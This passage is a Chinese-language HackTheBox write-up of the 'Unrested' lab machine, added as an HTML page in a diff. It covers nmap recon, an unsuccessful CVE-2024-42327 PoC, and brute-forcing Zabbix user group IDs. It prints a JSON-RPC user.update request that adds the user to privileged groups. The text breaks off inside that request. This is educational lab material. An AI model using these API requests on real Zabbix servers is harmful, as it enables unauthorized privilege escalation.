@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P Unrested從 80 端口開始探索。發現了 Zabbix 7.0.0 版本，於是尋找相關的 CVE 漏洞，嘗試利用 CVE-2024-42327，但未能成功，進而使">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Machine - Unrested">
+<meta property="og:url" content="https://manesec.github.io/2024/12/06/2024-htb-machine/49-Unrested/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P Unrested從 80 端口開始探索。發現了 Zabbix 7.0.0 版本，於是尋找相關的 CVE 漏洞，嘗試利用 CVE-2024-42327，但未能成功，進而使">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206055932-bcqaf5x.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206060858-b73jo4p.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206060948-211jebh.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206025806-jv1sp6b.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206033226-8r51jrq.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206033724-7dulnfm.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206033655-aje62aw.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206063456-kw6oyai.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206033952-jlikgxk.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206034414-f19puq2.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206034514-1y9oq5u.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206034559-b8qt2nb.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206034643-45k9apf.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206034856-nki2kah.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/demo1-20241206040016-vy99363.gif">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206035210-wmuwer2.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206040141-ih37j3l.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206040236-y00j58i.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206040251-c72xl85.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206042006-oaz80d4.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206042813-rp7ck6u.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206043101-ohpt4vx.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206043158-1rw6g1a.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206044039-5thiupk.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206045544-qo5mjk4.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206045605-tvida89.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206050055-hphl333.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206050036-xt7pr6v.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206050136-h8gx6yz.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206050257-e7h2dg7.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206050348-1ssq5p7.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206050825-1e9bkyq.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206050955-tkd402r.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206052106-j00b8lc.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206052129-fd9xecc.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206065816-wljpt9b.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206065848-6zyr6tz.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206065940-xu76een.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206055223-4v2x0ew.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206055501-uzkzncz.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206055702-50xbnh2.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206055829-mla5wrp.png">
+<meta property="article:published_time" content="2024-12-06T00:58:00.000Z">
+<meta property="article:modified_time" content="2024-12-06T00:01:09.774Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206055932-bcqaf5x.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox - Machine - Unrested</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/12/06/2024/1205-htb-aptlabs/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/12/06/2024-htb-machine/49-Unrested/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/12/06/2024-htb-machine/49-Unrested/&text=HackTheBox - Machine - Unrested"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/12/06/2024-htb-machine/49-Unrested/&title=HackTheBox - Machine - Unrested"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/12/06/2024-htb-machine/49-Unrested/&is_video=false&description=HackTheBox - Machine - Unrested"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Unrested&body=Check out this article: https://manesec.github.io/2024/12/06/2024-htb-machine/49-Unrested/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/12/06/2024-htb-machine/49-Unrested/&title=HackTheBox - Machine - Unrested"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/12/06/2024-htb-machine/49-Unrested/&title=HackTheBox - Machine - Unrested"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/12/06/2024-htb-machine/49-Unrested/&title=HackTheBox - Machine - Unrested"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/12/06/2024-htb-machine/49-Unrested/&title=HackTheBox - Machine - Unrested"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/12/06/2024-htb-machine/49-Unrested/&name=HackTheBox - Machine - Unrested&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/12/06/2024-htb-machine/49-Unrested/&t=HackTheBox - Machine - Unrested"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox - Machine - Unrested
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-12-06T00:58:00.000Z" class="dt-published" itemprop="datePublished">2024-12-06</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">Let’s Sign Up HTB Academy to get Higher level of knowledge :P</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P</a></p>
+<h1 id="Unrested"><a href="#Unrested" class="headerlink" title="Unrested"></a>Unrested</h1><p>從 80 端口開始探索。發現了 Zabbix 7.0.0 版本，於是尋找相關的 CVE 漏洞，嘗試利用 CVE-2024-42327，但未能成功，進而使用 Burp Suite 分析請求並修改 POC 代碼。隨後，通過進一步的谷歌搜索，發現了其他相關漏洞和文章，特別是利用特定 API 來獲取用戶 ID，並嘗試將自己加入具有特殊權限的組。通過 API 的 user.update 功能，進行了一系列組的爆破測試，確認了系統中存在的用戶組，並成功將自己加入管理員組。這使得能夠查詢到所有用戶，並驗證了 SQL 注入的可能性。使用 sqlmap 工具對數據庫進行進一步的挖掘，嘗試獲取 admin 的 sessionid，並最終成功獲得。通過這個 sessionid，利用 API 執行命令行操作，嘗試在主機上運行腳本。儘管新版本的限制需要開啟特定配置才能執行全局腳本，但通過修改現有腳本，強制返回 sessionid，成功獲得遠程代碼執行權限。接下來，通過 sudo 權限執行 nmap，利用其 –datadir 參數，指定自定義腳本路徑，最終成功提升到 root 權限。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206055932-bcqaf5x.png" alt="image">​</p>
+<p>這周出了一個退役機器，賬號密碼如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">As is common <span class="keyword">in</span> real life pentests, </span><br><span class="line">you will start the Unrested box with credentials <span class="keyword">for</span> the following account on Zabbix: matthew / 96qzn0h2e1k3</span><br></pre></td></tr></table></figure>
+
+<p>同樣的，這裏我只記錄我完成的過程。</p>
+<h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><p>一開始當然是使用 nmap 掃一掃：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE REASON         VERSION</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=</span><br><span class="line">|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM</span><br><span class="line">80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET POST OPTIONS HEAD</span><br><span class="line">|_http-server-header: Apache/2.4.52 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Zabbix-on-80-Port"><a href="#Zabbix-on-80-Port" class="headerlink" title="Zabbix on 80 Port"></a>Zabbix on 80 Port</h1><p>看到 22 端口是打開的，由於 ssh 登陸不上去，所以只能從 80 這條路開始走。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206060858-b73jo4p.png" alt="image">​</p>
+<p>既然給了賬號密碼，那就嘗試登陸看看：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206060948-211jebh.png" alt="image">​</p>
+<p>結果看到版本 7.0.0 的 <code>Zabbix</code>​，所以第一步是去找有什麽 CVE 可以用。</p>
+<h2 id="Search-some-CVE-for-zabbix"><a href="#Search-some-CVE-for-zabbix" class="headerlink" title="Search some CVE for zabbix"></a>Search some CVE for zabbix</h2><p>直接打開瀏覽器谷歌搜索有什麽漏洞：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206025806-jv1sp6b.png" alt="image">​</p>
+<p>看到第一個 CVE ，所以直接找一下 POC </p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206033226-8r51jrq.png" alt="image">​</p>
+<p>然後找到這個： <a target="_blank" rel="noopener" href="https://github.com/compr00t/CVE-2024-42327">https://github.com/compr00t/CVE-2024-42327</a></p>
+<p>那當然是很開心的試一下，不過：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206033724-7dulnfm.png" alt="image">​</p>
+<p>看起來不行，代理到 burp 看看發生了什麽，於是就隨便修改了 <code>requests.post</code>​ 的代碼：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206033655-aje62aw.png" alt="image">​</p>
+<p>根據上面的POC動手試了一下，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206063456-kw6oyai.png" alt="image">​</p>
+<p>發現沒什麽有價值的東西，也不像有SQL的樣子，於是繼續谷歌搜索了一會，發現了這兩篇文章：</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/advisories/GHSA-gx59-7g62-6xhg">https://github.com/advisories/GHSA-gx59-7g62-6xhg</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.cve.news/cve-2024-36467/">https://www.cve.news/cve-2024-36467/</a></p>
+</li>
+</ul>
+<p>在第二篇文章中提到自己可以給自己增加到任意的組中：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206033952-jlikgxk.png" alt="image">​</p>
+<p>由於有些組有特殊的權限，於是就可以利用 組的特殊權限來提權，但是上面需要 <code>userid</code>​ 和 <code>usrgrpid</code>​，目前也不知道 <code>userid</code>​是什麽，然後在 Zabbix 的官方文檔中找看看有沒有api可以顯示<code>userid</code>​，結果找到了 <code>checkauthentication</code>​ 這個API：<a target="_blank" rel="noopener" href="https://www.zabbix.com/documentation/7.0/en/manual/api/reference/user/checkauthentication">https://www.zabbix.com/documentation/7.0/en/manual/api/reference/user/checkauthentication</a></p>
+<p>‍</p>
+<h2 id="Getting-current-user‘s-userid-and-bruteforce-usrgrpid"><a href="#Getting-current-user‘s-userid-and-bruteforce-usrgrpid" class="headerlink" title="Getting current user‘s userid and bruteforce usrgrpid"></a>Getting current user‘s userid and bruteforce usrgrpid</h2><p>所以一開始需要先登錄：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206034414-f19puq2.png" alt="image">​</p>
+<p>得到的 <code>result</code>​ 其實就是 <code>sessionid</code>​，然後使用 <code>user.checkAuthentication</code>​ 就可以得到 <code>userid</code>​：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206034514-1y9oq5u.png" alt="image">​</p>
+<p>也就是說當前的 <code>userid</code>​ 是 <code>3</code>​，那麽問題又來了，有哪些組可以增加呢？</p>
+<p>不知道有什麽組，但是使用 <code>user.update</code>​ 可以對當前用戶更新組，組的定義就是下面的 <code>usrgrpid</code>​，如果組不存在就會顯示 <code>Object does not exist</code>​。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206034559-b8qt2nb.png" alt="image">​</p>
+<p>既然不存在的時候顯示 <code>Object does not exist</code>​ ，這意味著可以從0到50進行爆破，下面就簡單的用一下 <code>Intruder</code>​來快速爆破看看：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206034643-45k9apf.png" alt="image">​</p>
+<p>等待了一段時間後，得到：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206034856-nki2kah.png" alt="image">​</p>
+<p>從掃描可以看出，系統存在 7-13 的用戶組，既然api支持增加多個組，那麽就可以嘗試暴力增加，如果出現錯誤就説明組不存在，如果沒出錯就繼續，所以如下：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/demo1-20241206040016-vy99363.gif" alt="demo1">​</p>
+<p>最後得到：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;jsonrpc&quot;</span>: <span class="string">&quot;2.0&quot;</span>,</span><br><span class="line">  <span class="string">&quot;method&quot;</span>: <span class="string">&quot;user.update&quot;</span>,</span><br><span class="line">  <span class="string">&quot;params&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;userid&quot;</span>: <span class="string">&quot;3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;usrgrps&quot;</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&quot;usrgrpid&quot;</span>: <span class="string">&quot;7&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&quot;usrgrpid&quot;</span>: <span class="string">&quot;8&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&quot;usrgrpid&quot;</span>: <span class="string">&quot;9&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&quot;usrgrpid&quot;</span>: <span class="string">&quot;11&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&quot;usrgrpid&quot;</span>: <span class="string">&quot;12&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&quot;usrgrpid&quot;</span>: <span 